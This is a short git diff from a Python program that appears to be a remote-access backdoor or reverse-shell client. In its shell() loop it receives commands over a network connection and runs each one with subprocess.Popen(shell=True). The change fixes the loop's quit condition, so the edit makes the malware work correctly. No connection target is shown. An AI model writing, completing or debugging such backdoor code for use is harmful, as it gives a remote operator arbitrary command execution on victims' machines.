@@ -29,7 +29,7 @@ def connection():
 def	shell():
 	while True:
 		command = reliable_recv()
-		if command == 'quit' or 'q':
+		if command == 'quit' or command == 'q':
 			break
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
